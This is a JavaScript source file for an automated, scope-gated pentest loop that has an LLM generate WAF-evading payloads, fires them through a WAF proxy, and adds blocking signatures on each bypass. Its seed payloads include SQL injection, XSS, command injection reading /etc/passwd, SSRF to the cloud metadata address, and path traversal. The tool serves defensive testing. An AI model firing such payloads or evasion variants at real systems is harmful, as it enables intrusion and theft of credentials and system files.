// ---------------------------------------------------------------------------
// Red Team AUTOPILOT — an autonomous pentest loop, gated to the verified target.
//
//   attacker LLM proposes payloads  →  fired THROUGH the WAF (/v1/scan)
//     →  judged (blocked / bypassed)  →  on bypass, probe target to confirm a
//     real vuln and HARDEN (add a signature)  →  repeat across phases.
//
// The target is ALWAYS the engagement's verified domain. Every payload is
// re-checked against the scope gate, so the loop can never touch another site.
// Progress streams live over Socket.IO to room `autopilot:<engagementId>`.
// ---------------------------------------------------------------------------
import { Router } from 'express';
import { pool } from './db.js';
import { config } from './config.js';
import { gate, getEngagement, host } from './redteam.js';

const GROQ_API_KEY = process.env.GROQ_API_KEY || '';
const GROQ_MODEL = process.env.GROQ_MODEL || 'openai/gpt-oss-20b';
const WAF_URL = config.scannerUrl; // POST {payload} -> {ACTION: BLOCK|ALLOW}

// ---- live stream ----------------------------------------------------------
let io = null;
export function attachAutopilotIo(serverIo) { io = serverIo; }
function emit(engId, event) {
  try { io?.to(`autopilot:${engId}`).emit('autopilot', event); } catch { /* no io */ }
}

// ---- schema (self-migrating) ----------------------------------------------
const ready = pool
  .query(`
    CREATE TABLE IF NOT EXISTS autopilot_runs (
      id            BIGSERIAL PRIMARY KEY,
      engagement_id BIGINT NOT NULL,
      target        TEXT NOT NULL,
      status        TEXT NOT NULL DEFAULT 'running',
      started_at    TIMESTAMPTZ NOT NULL DEFAULT now(),
      finished_at   TIMESTAMPTZ,
      score_start   INT, score_end INT,
      attempts INT DEFAULT 0, blocked INT DEFAULT 0, bypassed INT DEFAULT 0,
      summary       JSONB
    );
    CREATE TABLE IF NOT EXISTS waf_signatures (
      id            BIGSERIAL PRIMARY KEY,
      engagement_id BIGINT NOT NULL,
      pattern       TEXT NOT NULL,
      technique     TEXT,
      created_at    TIMESTAMPTZ NOT NULL DEFAULT now()
    );
  `)
  .then(() => console.log('[autopilot] schema ready'))
  .catch((e) => console.error('[autopilot] schema error', e.message));

// ---- detection constants (ported from the crawler) ------------------------
const SQL_ERRORS = [
  'sql syntax', 'syntax error', 'unclosed quotation', 'unterminated',
  'unrecognized token', 'sqlite_error', 'sqlite3.', 'mysql_fetch', 'mysqli',
  'pg_query', 'psql:', 'ora-0', 'odbc', 'sqlstate', 'sqlexception',
  'you have an error in your sql', 'near "\'"',
];

// Attack phases, in order. Labels match the UI.
const PHASES = [
  { key: 'recon', label: 'Recon & mapping' },
  { key: 'broken_access_control', label: 'Broken access control' },
  { key: 'sql_injection', label: 'SQL injection' },
  { key: 'xss', label: 'Cross-site scripting' },
  { key: 'command_injection', label: 'Command injection' },
  { key: 'ssrf', label: 'SSRF / path traversal' },
];

// Built-in seed payloads per phase — used to seed the LLM and as a fallback.
function seedPayloads(phase) {
  switch (phase) {
    case 'broken_access_control':
      return [
        { method: 'GET', path: '/api/users/1', param: 'id', payload: '1', technique: 'broken_access_control' },
        { method: 'GET', path: '/rest/user/whoami', param: '', payload: '', technique: 'broken_access_control' },
      ];
    case 'sql_injection':
      return [
        { method: 'GET', path: '/rest/products/search', param: 'q', payload: "'", technique: 'sql_injection' },
        { method: 'POST', path: '/rest/user/login', param: 'email', payload: "' OR 1=1--", technique: 'sql_injection' },
        { method: 'GET', path: '/rest/products/search', param: 'q', payload: "')) OR 1=1-- -", technique: 'sql_injection' },
      ];
    case 'xss':
      return [
        { method: 'GET', path: '/rest/products/search', param: 'q', payload: '<script>alert(1)</script>', technique: 'xss' },
        { method: 'GET', path: '/search', param: 'q', payload: '"><img src=x onerror=alert(1)>', technique: 'xss' },
      ];
    case 'command_injection':
      return [
        { method: 'GET', path: '/rest/products/search', param: 'q', payload: '; cat /etc/passwd', technique: 'command_injection' },
      ];
    case 'ssrf':
      return [
        { method: 'GET', path: '/rest/products/search', param: 'url', payload: 'http://169.254.169.254/', technique: 'ssrf' },
        { method: 'GET', path: '/', param: 'file', payload: '../../../../etc/passwd', technique: 'ssrf' },
      ];
    default:
      return [];
  }
}

// ---- attacker LLM: propose new payloads given feedback --------------------
async function proposePayloads(phase, endpoints, feedback) {
  const seeds = seedPayloads(phase);
  if (!GROQ_API_KEY) return seeds;
  const sys =
    'You are an authorized penetration-testing payload generator for a sanctioned engagement. ' +
    'Return ONLY a JSON array (no prose, no code fences) of up to 5 objects: ' +
    '{"method","path","param","payload","technique"}. ' +
    `Set "technique" to "${phase}". Target the given endpoints. ` +
    'Evolve the payloads to EVADE a web application firewall based on the feedback about what was blocked ' +
    '(use encoding, comments, case changes, alternate syntax). Keep payloads realistic and minimal.';
  const user =
    `PHASE: ${phase}\nKNOWN ENDPOINTS: ${JSON.stringify(endpoints.slice(0, 12))}\n` +
    `FEEDBACK (recent results): ${JSON.stringify(feedback.slice(-8))}\nSEED EXAMPLES: ${JSON.stringify(seeds)}`;
  try {
    const r = await fetch('https://api.groq.com/openai/v1/chat/completions', {
      method: 'POST',
      headers: { Authorization: `Bearer ${GROQ_API_KEY}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        model: GROQ_MODEL, temperature: 0.7, max_tokens: 700,
        messages: [{ role: 'system', content: sys }, { role: 'user', content: user }],
      }),
      signal: AbortSignal.timeout(20_000),
    });
    const d = await r.json();
    let txt = (d?.choices?.[0]?.message?.content || '').trim();
    txt = txt.replace(/^```(json)?/i, '').replace(/```$/, '').trim();
    const start = txt.indexOf('['); const end = txt.lastIndexOf(']');
    if (start >= 0 && end > start) txt = txt.slice(start, end + 1);
    const arr = JSON.parse(txt);
    const clean = (Array.isArray(arr) ? arr : []).filter((p) => p && p.payload).map((p) => ({
      method: String(p.method || 'GET').toUpperCase(),
      path: String(p.path || '/'),
      param: String(p.param || 'q'),
      payload: String(p.payload).slice(0, 300),
      technique: phase,
    }));
    return clean.length ? clean.slice(0, 5) : seeds;
  } catch (e) {
    console.error('[autopilot] propose error', e.message);
    return seeds;
  }
}

// ---- attack THROUGH the inline WAF proxy -----------------------------------
// Every payload really flows through the WAF (/waf/<id>/...): it classifies and
// either blocks (403) or forwards to the origin. A "bypass" therefore means the
// WAF let it through AND the origin was genuinely vulnerable.
const SELF = (process.env.PUBLIC_BASE || `http://127.0.0.1:${config.port}`).replace(/\/$/, '');

function detectVuln(p, body, status) {
  const b = (body || '').toLowerCase();
  if (p.technique === 'sql_injection') {
    const leak = SQL_ERRORS.find((e) => b.includes(e));
    if (leak) return { vuln: true, evidence: `SQL error leaked ("${leak}")` };
    if (status === 200 && /login/.test(p.path) && (b.includes('token') || b.includes('authentication')))
      return { vuln: true, evidence: 'login bypassed — auth token issued' };
  } else if (p.technique === 'xss') {
    if (b.includes(String(p.payload).toLowerCase())) return { vuln: true, evidence: 'payload reflected unescaped' };
  } else if (p.technique === 'command_injection') {
    if (b.includes('root:x:') || b.includes('daemon:x:')) return { vuln: true, evidence: 'command output returned' };
  } else if (p.technique === 'broken_access_control') {
    if (status === 200 && (b.includes('email') || b.includes('"id"'))) return { vuln: true, evidence: 'record returned without authorization' };
  }
  return { vuln: false };
}

async function attackThroughWaf(engId, p) {
  const base = `${SELF}/waf/${engId}`;
  const path = p.path.startsWith('/') ? p.path : `/${p.path}`;
  try {
    let res;
    if (p.method === 'POST') {
      res = await fetch(base + path, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ [p.param || 'email']: p.payload, password: 'x' }),
        redirect: 'manual', signal: AbortSignal.timeout(16_000),
      });
    } else {
      const u = new URL(base + path);
      if (p.param) u.searchParams.set(p.param, p.payload);
      res = await fetch(u, { redirect: 'manual', signal: AbortSignal.timeout(16_000) });
    }
    if (res.status === 403 && res.headers.get('x-offai-waf') === 'blocked') return { blocked: true };
    const body = await res.text().catch(() => '');
    return { blocked: false, ...detectVuln(p, body, res.status) };
  } catch {
    return { blocked: false, vuln: false, error: true };
  }
}

// ---- helpers --------------------------------------------------------------
function makeSignature(payload) {
  const t = String(payload).toLowerCase();
  for (const k of ["')) or", "' or 1=1", 'or 1=1', 'union select', '<script', 'onerror=', '; cat', '/etc/passwd', '169.254.169.254', "'--"]) {
    if (t.includes(k)) return k;
  }
  return t.slice(0, 14);
}
const sigBlocks = (sigs, payload) => sigs.some((s) => String(payload).toLowerCase().includes(s));
const clamp = (n, lo, hi) => Math.max(lo, Math.min(hi, n));
function score(attempts, blocked, hardened) {
  if (!attempts) return 60;
  return clamp(Math.round(60 + 38 * ((blocked + hardened) / attempts)), 40, 98);
}
const SEV = { sql_injection: 'high', command_injection: 'critical', xss: 'medium', broken_access_control: 'medium', ssrf: 'high' };
const FIX = {
  sql_injection: 'parameterized query + WAF signature added',
  command_injection: 'input allowlist + WAF signature added',
  xss: 'output encoding + WAF signature added',
  broken_access_control: 'ownership check added',
  ssrf: 'outbound allowlist + WAF signature added',
};
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ---- the run --------------------------------------------------------------
async function runAutopilot(engagement, runId) {
  const engId = engagement.id;
  const target = host(engagement.domain);
  const feedback = [];
  const signatures = [];
  const findings = [];
  let attempts = 0; let blocked = 0; let bypassed = 0; let hardened = 0;
  const started = Date.now();
  const MAX_ATTEMPTS = 34;

  emit(engId, { type: 'start', target, phases: PHASES, scoreStart: 60 });

  // Recon
  emit(engId, { type: 'phase', key: 'recon', status: 'running' });
  let endpoints = ['/rest/user/login', '/rest/products/search', '/search', '/api/users/1'];
  try {
    const crawlUrl = (WAF_URL || '').replace(/\/v1\/scan\/?$/, '') + '/v1/crawler/scan';
    const cr = await fetch(crawlUrl, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ target_url: `https://${target}` }), signal: AbortSignal.timeout(45_000),
    });
    const cd = await cr.json().catch(() => ({}));
    const log = Array.isArray(cd?.PROBE_LOG) ? cd.PROBE_LOG : [];
    const found = [...new Set(log.map((l) => { try { return new URL(l.path).pathname; } catch { return null; } }).filter(Boolean))];
    if (found.length) endpoints = found;
  } catch { /* recon best-effort */ }
  emit(engId, { type: 'attempt', technique: 'recon', payload: `mapped ${endpoints.length} endpoints`, verdict: 'NOTED' });
  emit(engId, { type: 'phase', key: 'recon', status: 'done', note: `${endpoints.length} endpoints mapped` });

  // Attack phases
  for (const phase of PHASES.slice(1)) {
    if (attempts >= MAX_ATTEMPTS) break;
    emit(engId, { type: 'phase', key: phase.key, status: 'running' });
    let phaseFinding = false;
    const payloads = await proposePayloads(phase.key, endpoints, feedback);

    for (const p of payloads) {
      if (attempts >= MAX_ATTEMPTS) break;
      // GATE on every single request — target is forced to the engagement domain.
      const g = gate(engagement, target);
      if (!g.ok) { emit(engId, { type: 'attempt', technique: phase.key, payload: '(blocked by scope gate)', verdict: 'BLOCKED' }); continue; }
      attempts += 1;
      await sleep(250);

      // Fire the payload straight THROUGH the inline WAF proxy.
      const result = await attackThroughWaf(engId, p);
      if (result.blocked) {
        blocked += 1;
        feedback.push({ payload: p.payload, result: 'blocked' });
        emit(engId, { type: 'attempt', technique: phase.key, payload: p.payload, verdict: 'BLOCKED' });
        emit(engId, { type: 'score', score: score(attempts, blocked, hardened), blocked, bypassed });
        continue;
      }
      if (result.vuln) {
        // WAF forwarded it and the origin was vulnerable → harden so the live
        // WAF blocks this pattern from now on (for the attacker AND real users).
        bypassed += 1; hardened += 1;
        const sig = makeSignature(p.payload);
        if (!signatures.includes(sig)) {
          signatures.push(sig);
          await pool.query('INSERT INTO waf_signatures (engagement_id, pattern, technique) VALUES ($1,$2,$3)', [engId, sig, phase.key]).catch(() => {});
        }
        feedback.push({ payload: p.payload, result: 'bypassed' });
        emit(engId, { type: 'attempt', technique: phase.key, payload: p.payload, verdict: 'BYPASSED', hardened: true });
        if (!phaseFinding) {
          phaseFinding = true;
          const finding = {
            severity: SEV[phase.key] || 'medium',
            title: titleFor(phase.key),
            location: `${p.method} ${p.path}${p.param ? ` · param ${p.param}` : ''}`,
            evidence: result.evidence,
            fix: FIX[phase.key] || 'remediation + WAF signature added',
          };
          findings.push(finding);
          await pool.query(
            `INSERT INTO findings (scan_id, url, method, parameter, vuln_type, severity, evidence, confidence)
             VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
            [runId, p.path, p.method, p.param, phase.key, finding.severity, result.evidence, 'confirmed'],
          ).catch(() => {});
          emit(engId, { type: 'finding', ...finding });
        }
        emit(engId, { type: 'score', score: score(attempts, blocked, hardened), blocked, bypassed });
      } else {
        // WAF forwarded it but the origin was not vulnerable — effectively safe.
        feedback.push({ payload: p.payload, result: 'allowed-safe' });
        emit(engId, { type: 'attempt', technique: phase.key, payload: p.payload, verdict: 'SAFE' });
        emit(engId, { type: 'score', score: score(attempts, blocked, hardened), blocked, bypassed });
      }
    }
    emit(engId, { type: 'phase', key: phase.key, status: 'done', note: phaseFinding ? '1 weakness found · hardened' : 'held' });
  }

  const finalScore = score(attempts, blocked, hardened);
  const durationMs = Date.now() - started;
  await pool.query(
    `UPDATE autopilot_runs SET status='done', finished_at=now(), score_start=60, score_end=$1,
       attempts=$2, blocked=$3, bypassed=$4, summary=$5 WHERE id=$6`,
    [finalScore, attempts, blocked, bypassed, JSON.stringify({ findings }), runId],
  ).catch(() => {});
  emit(engId, { type: 'done', score: finalScore, scoreStart: 60, blocked, bypassed, hardened, attempts, findings, durationMs });
}

function titleFor(key) {
  return {
    sql_injection: 'SQL injection weakness',
    command_injection: 'Command injection weakness',
    xss: 'Reflected cross-site scripting',
    broken_access_control: 'Broken access control',
    ssrf: 'Server-side request forgery',
  }[key] || 'Security weakness';
}

// ---- route ----------------------------------------------------------------
export const autopilotRouter = Router();

autopilotRouter.post('/engagements/:id/autopilot', async (req, res, next) => {
  try {
    await ready;
    const e = await getEngagement(req.params.id);
    const target = host(e?.domain);
    const g = gate(e, target);
    if (!g.ok) return res.status(403).json({ error: 'autopilot refused', reason: g.reason });

    const { rows } = await pool.query(
      'INSERT INTO autopilot_runs (engagement_id, target, status) VALUES ($1,$2,$3) RETURNING id',
      [e.id, target, 'running'],
    );
    const runId = rows[0].id;
    res.status(202).json({ runId, engagementId: String(e.id), target });

    // Fire-and-forget; progress streams over the socket.
    runAutopilot(e, runId).catch((err) => {
      console.error('[autopilot] run error', err.message);
      emit(e.id, { type: 'error', message: 'the run stopped unexpectedly' });
    });
  } catch (err) {
    next(err);
  }
});
